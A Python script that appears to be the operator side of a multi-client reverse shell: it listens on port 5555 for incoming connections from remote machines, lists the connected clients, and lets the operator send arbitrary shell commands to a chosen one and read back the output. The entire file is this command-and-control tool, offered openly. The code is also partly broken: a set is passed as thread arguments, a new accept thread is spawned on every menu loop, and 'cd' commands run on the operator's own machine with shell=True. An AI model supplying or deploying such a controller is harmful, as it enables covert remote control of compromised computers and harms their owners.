import socket
import threading
import subprocess
import sys

HOST = ''   # Symbolic name meaning all available interfaces
PORT = 5555  # Arbitrary non-privileged port

clients = []

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(10)  # Maximum number of clients that can connect simultaneously


def handle_client(socket):
    conn, addr = socket.accept()
    print(f"Client {addr[0]}:{addr[1]} connected.")
    clients.append(conn)


def handle_client_input(conn):
    addr = conn.getpeername()

    print(f"Connected to client: {addr[0]}:{addr[1]}", end="\n")

    print("Enter a command to execute or type 'exit' to quit:\n")

    while True:
        conn.send("pwd".encode())
        output = conn.recv(1024).decode();
        print(output, end=">")
        command = input()
        
        if command.lower() == 'clear':
            conn.setblocking(0)
            continue
        
        if command.lower() == 'exit':
            conn.setblocking(0)
            break

        try:
            conn.send(command.encode("utf-8"))
            
            if command.startswith("cd "):
                # execute cd command using subprocess
                output = subprocess.check_output(command, shell=True)
                # send output back to server
                conn.send(output)
            else:
                # receive output from client and print it
                output = conn.recv(1024).decode("utf-8")
                print(output)
            
        except ConnectionResetError:
            print(f"Connection to {addr[0]}:{addr[1]} lost.")
            break

def list_clients():
    print("\n*****\nConnected clients:\n*****")
    for i, client in enumerate(clients):
        addr = client.getpeername()
        hostname = addr[0]
        port = addr[1]
        print(f"{i+1}. {hostname}:{port}")
    
    while True:
        user_input = input(
            "Enter a valid client numer or type 'exit' to quit: ").lower()

        if user_input == 'exit':
            break

        try:
            index = int(user_input) - 1
            conn = clients[index]
            if conn:
                handle_client_input(conn)
                break
        except ValueError:
            continue


def main():
    print('Waiting for clients...')
    while True:
        thread = threading.Thread(target=handle_client, args={s})
        thread.start()

        command = input("Enter a command or type 'exit' to quit: ").lower()
        if command == 'list':
            list_clients()
        elif command == 'exit':
            print("Have a nice day!")
            sys.exit()



if __name__ == '__main__':
    main()
